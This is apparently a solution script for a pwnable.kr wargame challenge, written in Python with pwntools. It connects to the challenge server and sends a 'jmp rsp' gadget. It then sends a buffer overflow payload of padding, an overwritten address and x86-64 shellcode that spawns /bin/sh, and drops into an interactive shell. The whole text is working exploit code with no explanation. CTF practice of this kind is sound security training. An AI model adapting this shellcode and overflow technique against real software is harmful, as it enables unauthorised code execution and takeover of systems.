from pwn import *

BINSH = '\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05'
ID_ADDR = p64(0x6020a0)
PAYLOAD = 'A'*40 + ID_ADDR + BINSH

conn=remote('pwnable.kr',9010)
conn.sendline(asm("jmp rsp",arch='amd64'))
conn.sendline("1")
conn.sendline(PAYLOAD)
conn.interactive()
